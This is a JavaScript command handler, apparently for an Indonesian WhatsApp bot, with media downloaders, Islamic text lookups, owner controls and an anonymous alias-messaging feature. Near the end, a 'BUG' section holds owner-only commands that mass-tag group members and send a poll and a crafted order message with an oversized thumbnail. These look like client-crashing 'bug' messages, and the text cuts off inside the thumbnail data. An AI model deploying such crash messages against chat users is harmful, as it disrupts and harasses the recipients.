if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
m.reply(mess.wait)
let { webp2mp4File } = require('../message/uploader')
let media = await liaacans.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await liaacans.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: fkontak })
await fs.unlinkSync(media)
}
break
case 'tourl': {
if (cekUser("id", m.sender) == null) throw mess.user
  m.reply(mess.wait)
  let { UploadFileUgu, webp2mp4File, TelegraPh } = require('../message/uploader')
  let media = await liaacans.downloadAndSaveMediaMessage(quoted)
  if (/image/.test(mime)) {
  let anu = await TelegraPh(media)
  m.reply(util.format(anu))
  } else if (!/image/.test(mime)) {
  let anu = await UploadFileUgu(media)
  m.reply(util.format(anu))
  }
  await fs.unlinkSync(media)
  }
  break
//Random Menu
case 'pinterest': {
if (cekUser("id", m.sender) == null) throw mess.user
  if (!text) return m.reply(`Mau Cari Apa Di ${command}?\nExample : *${prefix + command} hinata*`)
  m.reply(mess.wait)
  let anu = await pinterest(text)
  result = anu[Math.floor(Math.random() * anu.length)]
  let buttonspinterest = [{buttonId: `pinterest ${text}`, buttonText: {displayText: 'Next Result'}, type: 1}]
  liaacans.sendMessage(m.chat, { image: { url: result }, caption: 'Source Url : '+result, buttons: buttonspinterest }, { quoted: fkontak })
  }
  break
case 'wallpaper': {
if (cekUser("id", m.sender) == null) throw mess.user
  if (!text) return m.reply(`Mau Cari Apa Di ${command}?\nExample : *${prefix + command} hinata*`)
  m.reply(mess.wait)
  let anu = await wallpaper(text)
  result = anu[Math.floor(Math.random() * anu.length)]
  let buttonswallpaper = [{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Result'}, type: 1}]
  liaacans.sendMessage(m.chat, { image: { url: result.image[0] }, caption: `Source Url : ${result.image[2] || result.image[1] || result.image[0]}`, buttons: buttonswallpaper }, { quoted: fkontak })
  }
  break
case 'quotesanime': {
if (cekUser("id", m.sender) == null) throw mess.user
  m.reply(mess.wait)
  let anu = await quotesAnime()
  result = anu[Math.floor(Math.random() * anu.length)]
  let buttonsquotes = [{buttonId: `quotesanime`, buttonText: {displayText: 'Next Result'}, type: 1}]
  liaacans.sendButtonText(m.chat, buttonsquotes, `${result.quotes}\n\nBy : ${result.karakter}`, global.ownerName, m)
  }
  break
case 'wikimedia': {
  if (!isPremium) throw mess.prem
  if (!text) return 'Masukkan Query Title'
  let wiki = await wikimedia(text)
  result = wiki[Math.floor(Math.random() * wiki.length)]
  let buttons = [{buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Result'}, type: 1}]
  let buttonMessage = {
  image: { url: result.image },
  caption: `📄 Title : ${result.title}
📬 Source : ${result.source}
🔗 Media Url : ${result.image}`,
  footer: global.ownerName,
  buttons: buttons,
  headerType: 4
  }
  liaacans.sendMessage(m.chat, buttonMessage, { quoted: fkontak })
  }
  break
//Downloader
case 'ytmp4': case 'ytvideo': case 'ytv': {
  if (!isPremium) throw mess.prem
  let { ytv } = require('../message/y2mate')
  if (!q) return m.reply(`Gunakan Format : ${command} linknya`)
  if (!isUrl(q)) return m.reply('Link Invalid ❎')
  if (!q.includes('youtube')/('youtu.be')) return m.reply('Link Invalid ❎')
  await m.reply(mess.wait)
  let quality = args[1] ? args[1] : '360p'
  let media = await ytv(text, quality)
  if (media.filesize >= 100000) return m.reply('File Melebihi Batas Silahkan Download Sendiri : '+media.dl_link)
  var caption = `---- Youtube Downloader -----
  
📄 Judul : ${media.title}
🎚️ Size : ${media.filesizeF}
🔗 Url : ${isUrl(text)}
📥 Format : MP4
📮 Resolusi : ${args[1] || '360p'}`
  liaacans.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: caption }, { quoted: m })
  }
  break
case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		liaacans.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		/**case 'juzamma': {
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		liaacans.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		liaacans.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		liaacans.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		liaacans.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break**/
		case 'hadis': case 'hadist': {
		if (cekUser("id", m.sender) == null) throw mess.user
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (cekUser("id", m.sender) == null) throw mess.user
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		liaacans.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (cekUser("id", m.sender) == null) throw mess.user
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
case 'ytmp3': case 'ytaudio': case 'yta': {
  if (!isPremium) throw mess.prem
  let { yta } = require('../message/y2mate')
  if (!q) return m.reply(`Gunakan Format : ${command} linknya`)
  if (!isUrl(q)) return m.reply('Link Invalid ❎')
  if (!q.includes('youtube')/('youtu.be')) return m.reply('Link Invalid ❎')
  await m.reply(mess.wait)
  let quality = args[1] ? args[1] : '128kbps'
  let media = await yta(text, quality)
  if (media.filesize >= 100000) return m.reply('File Melebihi Batas Silahkan Download Sendiri : '+media.dl_link)
  var caption = `*------ Youtube Downloader -----*

📄 Title : ${media.title}
🎚️ Size : ${media.filesizeF}
🔗 Url : ${isUrl(text)}
📥 Format : MP3
📮 Resolusi : ${args[1] || '128kbps'}`
  liaacans.sendImage(m.chat, media.thumb, caption, m)
  liaacans.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: fkontak })
  }
  break
case 'yts': case 'ytsearch': {
  if (!isPremium) throw mess.prem
  m.reply(mess.wait)
  if (!text) return `Example : ${prefix + command} story wa anime`
  let yts = require("yt-search")
  let search = await yts(text)
  let teks = '*---- Data Ditemukan ----*\n\n Keywords : '+text+'\n\n'
  let no = 1
  for (let i of search.all) {
  teks += `🔢 No : ${no++}
🎞️ Type : ${i.type}
📀 Video ID : ${i.videoId}
📄 Title : ${i.title}
👁️ Views : ${i.views}
👁️ Duration : ${i.timestamp}
📤 Upload : ${i.ago}
👨‍🎤 Author : ${i.author.name}
🔗 Url : ${i.url}\n\n─────────────────\n\n`
  }
  liaacans.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: fkontak })
  }
  break
case 'play':
  if (!isPremium) throw mess.prem
  if (!text) return `Example : ${prefix + command} story wa anime`
  let yts = require("yt-search")
  let search = await yts(text)
  let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
  let buttons = [{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: 'Audio 🎵'}, type: 1}, {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: 'Video 🎦'}, type: 1}]
  let buttonMessage = {
  image: { url: anu.thumbnail },
  caption: `*----- DATA DITEMUKAN -----*
  
*📄 Title :* ${anu.title}
*⌚ Duration :* ${anu.timestamp}
*👁️ Viewers :* ${anu.views}
*📤 Upload :* ${anu.ago}
*👨‍🎤 Channel :* ${anu.author.url}
*🔗 Url :* ${anu.url}`,
  footer: creator,
  buttons: buttons,
  headerType: 4
  }
  liaacans.sendMessage(m.chat, buttonMessage, { quoted: fkontak })
  break
case 'tiktokmp3': case 'tiktokaudio': {
                if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(`https://anabotofc.herokuapp.com/api/download/tiktok2?url=${text}&apikey=AnaBot`)
                let buttons = [
                    {buttonId: `allmenu`, buttonText: {displayText: '📖List Menu'}, type: 1},
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: creator,
                    buttons: buttons,
                    headerType: 2
                }
                await liaacans.sendMessage(m.chat, buttonMessage, { quoted: m })
                liaacans.sendMessage(m.chat, { audio: { url: anu.result.nowm }, mimetype: 'audio/mpeg'}, { quoted: fkontak })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
	        if (!isPremium) throw mess.prem
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('liaacans', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) liaacans.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson('https://restapi-liaacans.herokuapp.com/api/download/tiktok2?url=https://vt.tiktok.com/ZSeJ7P56G&apikey=APIKEY')
                    liaacans.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
                if (!isPremium) throw mess.prem
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('liaacans', '/downloader/joox', { query: text }, 'apikey'))
                await liaacans.sendImage(m.chat, anu.result.img, `⭔ Title : ${anu.result.lagu}\n⭔ Album : ${anu.result.album}\n⭔ Singer : ${anu.result.penyanyi}\n⭔ Publish : ${anu.result.publish}\n⭔ Lirik :\n${anu.result.lirik.result}`, m)
                liaacans.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!isPremium) throw mess.prem
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('liaacans', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                await liaacans.sendImage(m.chat, anu.result.thumb, `⭔ Title : ${anu.result.title}\n⭔ Url : ${isUrl(text)[0]}`)
                liaacanssendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: fkontak })
            }
            break
	        case 'twitdl': case 'twitter': {
	        if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('liaacans', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                liaacans.sendMessage(m.chat, buttonMessage, { quoted: fkontak })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('liaacans', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                await liaacans.sendMessage(m.chat, buttonMessage, { quoted: m })
                liaacans.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: fkontak })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
	        if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                liaacans.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `⭔ Title : ${anu.result.title}`}, { quoted: fkontak })
            }
            break
	        case 'pindl': case 'pinterestdl': {
	        if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                liaacans.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: fkontak })
            }
            break
            case 'umma': case 'ummadl': {
              if (!isPremium) throw mess.prem
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('../message/scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: liaacans.user.name,
			buttons,
			headerType: 4
		    }
		    liaacans.sendMessage(m.chat, buttonMessage, { quoted: fkontak })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        liaacans.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
case 'join': {
if (!isCreator) throw mess.owner
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await liaacans.groupAcceptInvite(result)
m.reply(`Sukses`)
}
break
case 'leave': {
if (!isCreator) throw mess.owner
   m.reply(`babay grup tolol:v`)
await liaacans.groupLeave(m.chat)
}
break
case 'block': {
if (!isCreator) throw mess.owner
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.updateBlockStatus(users, 'block')
 m.reply(`Sukses Block User`)
}
break
case 'unblock': {
if (!isCreator) throw mess.owner
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.updateBlockStatus(users, 'unblock')
m.reply(`Sukses Unblock User`)
}
break
case 'public': {
                if (!isCreator) throw mess.owner
                liaacans.public = true
                m.reply('*Sukses Change To Public Usage*')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                liaacans.public = false
                m.reply('*Sukses Change To Self Usage*')
            }
            break
case 'delete': case 'del': {
if (cekUser("id", m.sender) == null) throw mess.user
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                liaacans.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'menfes': case 'menfess': { 
if (cekUser("id", m.sender) == null) throw mess.user
		        if (m.isGroup) throw ('fitur tidak dapat digunakan di grup')
            	if (!text) throw `Example : ${prefix + command} 62858xxxxx|nama samaran|pesan`
            var mon = args.join(' ')
            var m1 = mon.split("|")[0]
            var m2 = mon.split("|")[1]
            var m3 = mon.split("|")[2]
               let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `BOT TELAH ONLINE : ${runtime(process.uptime())}`,jpegThumbnail: global.thumb}}}
               let mq1 = m1 + '@s.whatsapp.net'
               let kawk = ('PESAN RAHASIA')
               let me = m.sender
               let ments = [mq1, me]
               let pjtxt = `Pesan Dari : ${m2} \nUntuk : @${mq1.split('@')[0]}\n\n${m3}`
               let buttons = [{ buttonId: 'menfessconfirm', buttonText: { displayText: 'CONFIRM' }, type: 1 }]
            await liaacans.sendButtonText(m1 + '@s.whatsapp.net', buttons, pjtxt, kawk, m, {mentions: ments, quoted: kafloc})
            let akhji = `Pesan Telah Terkirim\nKe @${mq1.split('@')[0]}`
            await liaacans.sendButtonText(m.chat, buttons, akhji, creator, m, {mentions: ments, quoted: kafloc})
            }
            break
case 'menfessconfirm':
if (cekUser("id", m.sender) == null) throw mess.user
		 liaacans.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess nyaa🤭`})
		  m.reply(`Terimakasih Menfess Telah Diterima.`)
		break
//----------------[ BUG ALL FIXED ]-----------------//
// JANGAN DI SALAH GUNAKAN FITUR INI!!!
case 'inibug': {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
liaacans.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break
case 'poll': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA KIZU BOT",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM BROTHER BY NAIN OFC"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
m.reply('sukses sendbug')
}
break
case 'troli2': {
if (!isCreator) throw mess.owner
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
						"orderId": "449756950375071",
						"thumbnail": "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